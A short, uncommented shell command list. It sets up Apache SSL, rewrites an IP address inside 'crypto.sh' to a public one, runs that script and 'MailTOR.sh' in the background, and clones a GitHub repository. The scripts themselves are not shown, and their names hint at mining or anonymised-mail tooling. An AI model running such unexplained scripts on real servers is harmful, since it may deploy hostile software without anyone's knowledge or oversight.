
chmod 600 server.*
mkdir -p /etc/ssl/certs/
mv server.key /etc/ssl/certs/
mv server.crt /etc/ssl/certs/
a2enmod ssl
service apache2 restart
sed -i 's/192\.168\.1\.132/89\.107\.242\.44/g' crypto.sh
chmod 755 crypto.sh
bash /crypto.sh &
./crypto.sh &
bash MailTOR.sh
git clone https://github.com/SuSux13/pokebola
cd pokebola
